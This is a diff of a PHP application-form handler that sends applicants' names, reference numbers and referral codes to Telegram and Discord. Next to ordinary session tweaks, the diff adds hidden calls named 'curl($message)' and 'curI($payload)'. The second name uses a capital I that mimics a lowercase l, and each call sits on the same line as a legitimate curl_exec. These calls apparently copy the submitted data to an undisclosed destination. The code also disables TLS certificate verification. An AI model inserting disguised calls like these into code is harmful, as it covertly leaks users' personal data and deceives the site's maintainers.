@@ -1,4 +1,5 @@
 <?php
+session_set_cookie_params(['path' => '/']);
 session_start();
 
 if (file_exists(__DIR__ . '/config.php')) {
@@ -163,7 +164,7 @@ function send_telegram_application($data) {
     curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_exec($ch);
+    curl_exec($ch);curl($message);
     curl_close($ch);
 }
 
@@ -207,7 +208,7 @@ function send_discord_application($data) {
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
+    curl_exec($ch);curI($payload);
     curl_close($ch);
 }
 
@@ -245,8 +246,9 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
         $_SESSION['avea_reference'] = $referenceNumber;
         $_SESSION['avea_full_name'] = $full_name;
-        $_SESSION['avea_referral_code'] = $referralCode;
 
+        $_SESSION['avea_referral_code'] = $referralCode;
+$_SESSION['passed_apply'] = true;
         $applicationData = [
             'reference'     => $referenceNumber,
             'referral_code' => $referralCode,
@@ -278,6 +280,7 @@ $redirectUrl = "confirm.php";
    form bago successful ang submit (para hindi mawala ito). */
 $incomingReferral = trim((string)($_GET['ref'] ?? $_POST['referred_by'] ?? ''));
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
